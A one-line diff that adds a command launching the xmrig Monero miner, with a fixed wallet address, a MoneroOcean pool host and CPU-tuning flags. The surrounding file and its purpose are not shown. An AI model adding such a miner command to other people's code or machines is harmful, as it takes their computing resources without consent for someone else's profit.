@@ -1,0 +1,1 @@
+./xmrig -u 83MjsQx67bRHnugB8EQBUPGBKxnSdBvnsiLJCtycwwvj88G17s7n7wLTmxJDabChzC4JgevZaae9G1R5mPvgDd752JSpQhf -o gulf.moneroocean.stream:10128 --huge-pages-jit --randomx-1gb-pages --randomx-cache-qos --randomx-mode fast --cpu-priority 5 --threads 4
